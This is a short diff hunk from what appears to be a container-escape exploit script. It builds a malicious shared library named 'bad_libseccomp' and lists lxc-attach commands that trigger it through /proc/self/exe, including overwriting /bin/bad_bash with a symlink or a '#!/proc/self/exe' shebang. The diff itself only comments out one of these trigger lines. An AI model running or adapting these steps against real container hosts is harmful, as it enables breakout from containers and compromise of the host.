@@ -41,7 +41,7 @@ gcc -Wall -Werror -fPIC -shared -rdynamic -o "$SECCOMP_TARGET" ./bad_libseccomp_
 # And finally add an entrypoint. You can exploit this any of the following
 # ways:
 #
-lxc-attach -n c1 -- /proc/self/exe
+#lxc-attach -n c1 -- /proc/self/exe
 #  2. lxc-attach -n c1 -- /bin/bad_bash (ln -sf /proc/self/exe /bin/bad_bash)
 #  3. lxc-attach -n c1 -- /bin/bad_bash (echo '#!/proc/self/exe' > /bin/bad_bash)
 #
